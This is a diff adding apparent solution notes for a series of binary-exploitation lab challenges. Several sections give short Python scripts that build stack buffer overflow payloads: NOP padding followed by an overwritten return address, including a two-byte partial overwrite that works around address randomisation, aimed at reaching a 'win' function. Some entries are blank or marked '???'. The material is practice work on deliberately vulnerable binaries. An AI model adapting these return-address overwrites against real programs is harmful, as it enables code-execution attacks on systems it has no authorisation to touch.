@@ -63,3 +63,69 @@ f = open("in.txt", "wb")
 f.write(number + payload)
 f.close()
 ```
+
+## ex 5.0
++ this challenge will let you send multiple payload records concatenated together.
+It will make sure that the total payload size fits in the allocated buffer
+on the stack  
++ triggers with number of payloads > 7
++ triggers with number of payloads = 0 or payload size = 0
+Script python:  
+```
+```  
+???
+
+## ex 5.1
+???
+
+## ex 6.0
++ this challenge's win function will check if the argument passed is 0x1337. We need to jump past the check  
+Script python:  
+```
+number = b"\x31\x32\x38\x0a"
+payload = b"\x90" * 120
+payload += b"\x89\x16\x40\x00\x00\x00\x00\x00"
+f = open("in.txt", "wb")
+f.write(number + payload)
+f.close()
+```
+
+# ex 6.1
+Script python:  
+```
+number = b"\x36\x34\x0a"
+payload = b"\x90" * 56
+payload += b"\xba\x14\x40\x00\x00\x00\x00\x00"
+f = open("in.txt", "wb")
+f.write(number + payload)
+f.close()
+```
+
+# ex 7.0
+Script python:  
+```
+number = b"\x34\x32\x0a"
+payload = b"\x90" * 40
+payload += b"\xce\x47"              # most significant 4 bits of second byte are random
+f = open("in.txt", "wb")
+f.write(number + payload)
+f.close()
+```
+
+## ex 7.1
+Script python:  
+```
+number = b"\x31\x32\x32\x0a"
+payload = b"\x90" * 120
+payload += b"\xa4\x19"              # most significant 4 bits of second byte are random
+f = open("in.txt", "wb")
+f.write(number + payload)
+f.close()
+```
+
+## ex 8.0
++ this challenge is careful about reading your input: it will allocate a correctly-sized temporary
+buffer on the heap, and then copy the data over to the stack  
+Script python:  
+```
+```
